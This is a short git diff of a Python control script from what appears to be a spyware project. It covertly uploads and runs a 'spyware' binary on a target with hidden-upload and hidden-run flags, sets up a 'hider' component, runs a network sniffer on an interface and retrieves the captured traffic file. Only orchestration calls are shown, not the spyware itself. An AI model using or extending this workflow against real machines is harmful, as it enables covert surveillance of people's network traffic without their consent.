@@ -34,7 +34,7 @@ def main():
 
     print(
         agent.write_file(
-            "/home/avner/Arazim-Projects-2024---spyware/hider",
+            "hider",
             targetHiderPath,
         )
     )
@@ -44,8 +44,8 @@ def main():
     print(
         agent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
-            "/home/avner/Arazim-Projects-2024---spyware/spyware",
-            "sentSpyware.spy",
+            "spyware",
+            "sentSpyware6.spy",
         )
     )
 
@@ -53,9 +53,10 @@ def main():
 
     print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
 
-    params = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
+    params = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
     print(spyAgent.runContraption(params, 10))
-    print(spyAgent.retrieve_file("fishTest.txt"))
+    sleep(30)
+    print(spyAgent.retrieve_file("0.sniff"))
 
 
 if __name__ == "__main__":
